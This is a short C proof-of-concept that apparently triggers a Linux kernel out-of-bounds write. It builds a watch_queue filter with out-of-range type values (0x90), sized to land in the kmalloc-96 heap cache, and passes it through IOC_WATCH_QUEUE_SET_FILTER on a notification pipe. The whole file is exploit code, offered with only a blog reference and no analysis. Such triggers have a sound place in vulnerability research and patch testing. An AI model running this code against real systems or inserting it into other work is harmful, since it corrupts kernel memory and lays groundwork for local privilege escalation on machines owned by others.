// ref:
//   - https://blog.csdn.net/Breeze_CAT/article/details/123845526


#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/watch_queue.h>

typedef struct watch_notification_filter wnf_t;
typedef struct watch_notification_type_filter wntf_t;
int main() {  
    int fds[2];
    int nfilters = 10;
    wnf_t *filter = (wnf_t*)calloc(1, sizeof(wnf_t) + nfilters * sizeof(wntf_t));
    if (!filter) {
        perror("calloc()");
        exit(1);
    }
    filter->nr_filters = nfilters;
    for (int i = 0; i < nfilters; i++) {  // choose kmalloc-96
        if (i < 3)
            filter->filters[i].type = 1;
        else
        {
            filter->filters[i].type = 0x90;
        }
    }
    if (pipe2(fds, O_NOTIFICATION_PIPE) == -1) {
        perror("pipe2()");
        exit(1);
    }
    if (ioctl(fds[0], IOC_WATCH_QUEUE_SET_FILTER, filter) < 0) {
        perror("ioctl(IOC_WATCH_QUEUE_SET_FILTER)");
        exit(1);
    }
}
